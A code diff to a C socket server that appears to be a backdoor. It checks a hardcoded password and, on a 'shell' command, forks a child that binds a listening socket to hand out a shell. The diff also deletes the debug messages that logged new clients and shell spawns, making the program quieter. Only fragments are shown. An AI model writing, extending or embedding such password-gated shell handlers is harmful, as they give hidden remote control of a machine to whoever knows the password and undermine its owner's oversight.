@@ -76,7 +76,6 @@ int net_accept(t_client *cl, int serv_fd)
 		return (-4);
 	cl->is_connected = 1;
 	cl->fd = cl_fd;
-	printf("new client %d\n", cl_fd);
 	return cl_fd;
 
 }
@@ -90,7 +89,7 @@ char *gen_pwd(char *pwd)
 	return pwd;
 }
 
-void pop_shell(t_client *cl)
+void pop_shell(int port, t_client *cls)
 {
 	pid_t pid;
    
@@ -100,7 +99,8 @@ void pop_shell(t_client *cl)
 		return;
 	if (!pid)
 	{
-		close(cl->fd);
+		for (int i = 0; i < 3; i++)
+			close(cls[i].fd);
 		int sockfd, connfd, len;
     struct sockaddr_in servaddr, cli;
     // network
@@ -109,7 +109,7 @@ void pop_shell(t_client *cl)
 		exit(0);
 	servaddr.sin_family = AF_INET;
     servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
-    servaddr.sin_port = htons(cl->shellport);
+    servaddr.sin_port = htons(port);
     if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0)
 		exit(0);
 	if ((listen(sockfd, 2)) != 0)
@@ -131,7 +131,7 @@ void pop_shell(t_client *cl)
 
 }
 
-int net_receive(t_client *cl, fd_set *socks, int *n_cl)
+int net_receive(t_client *cl, fd_set *socks, int *n_cl, t_client *cls)
 {
 	char buff[1919];
 	char pwd[10] = "bvpf=duB\n";
@@ -162,8 +162,7 @@ int net_receive(t_client *cl, fd_set *socks, int *n_cl)
 	}
 	else if (!strcmp(buff, "shell\n"))
 	{
-		printf("poping a shell for %d\n", cl->fd);
-		pop_shell(cl);
+		pop_shell(cl->shellport, cls);
 		close(cl->fd);
 		FD_CLR(cl->fd, socks);
 		bzero(cl, sizeof(t_client));
@@ -228,7 +227,7 @@ int main()
 				}
 				else if (i != serv_sock)
 				{
-					int r = net_receive(find_cl(clients, i), &sockets, &n_clients);
+					int r = net_receive(find_cl(clients, i), &sockets, &n_clients, clients);
 					if (r == 1) //end of com
 					{
 						close(i);
